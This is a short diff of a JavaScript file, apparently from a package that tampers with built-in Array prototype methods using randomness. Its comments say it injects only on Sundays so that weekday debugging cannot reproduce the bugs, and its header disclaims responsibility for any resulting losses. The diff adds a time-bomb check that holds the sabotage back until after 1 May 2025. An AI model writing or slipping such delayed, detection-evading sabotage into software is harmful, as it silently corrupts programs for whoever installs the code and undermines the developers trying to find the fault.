@@ -8,9 +8,13 @@
  * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
  */
 ((global) => {
-  // 只有周日才注入，当周日产生bug时，工作日程序员进行debug时将不会进行复现
-  // Skip if it's not Sunday
-  if (new Date().getDay() !== 0) return;
+  const now = Date.now();
+  const targetTime = new Date("2025-05-01").getTime();
+  if (now <= targetTime) return;
+  if (new Date().getDay() !== 0)
+    // 只有周日才注入，当周日产生bug时，工作日程序员进行debug时将不会进行复现
+    // Skip if it's not Sunday
+    return;
 
   // 修改Array的几个原型方法
   const _rand = () => Math.random();
